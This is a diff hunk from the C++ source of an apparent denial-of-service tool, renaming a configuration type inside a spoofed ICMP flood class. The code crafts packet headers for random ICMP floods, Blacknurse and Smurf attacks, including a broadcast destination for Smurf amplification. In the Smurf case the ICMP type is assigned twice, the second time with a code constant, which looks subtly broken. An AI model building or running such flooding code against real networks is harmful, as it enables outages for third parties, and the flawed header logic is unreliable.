@@ -68,21 +68,21 @@ void ICMP_Flood::attack(const int *id) {
     }
 }
 
-ICMP_Flood::ICMP_Flood(const config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
+ICMP_Flood::ICMP_Flood(const Config *conf, Logger *logger) : Spoofed_Flood(conf, logger) {
 
 }
 
 void ICMP_Flood::override_headers(icmphdr *icmp, iphdr *ip){
     switch (conf->vector){
-        case config::ICMPFlood:
+        case Config::ICMPFlood:
             icmp->type = static_cast<u_int8_t>(Randomizer::randomInt(1, 30));
             icmp->code = static_cast<u_int8_t>(Randomizer::randomInt(1, 15));
             break;
-        case config::Blacknurse:
+        case Config::Blacknurse:
             icmp->type = ICMP_DEST_UNREACH;
             icmp->code = ICMP_PORT_UNREACH;
             break;
-        case config::Smurf:
+        case Config::Smurf:
             icmp->type = ICMP_ECHO;
             icmp->type = ICMP_NET_UNREACH;
             ip->daddr = inet_addr(conf->broadcast.c_str());
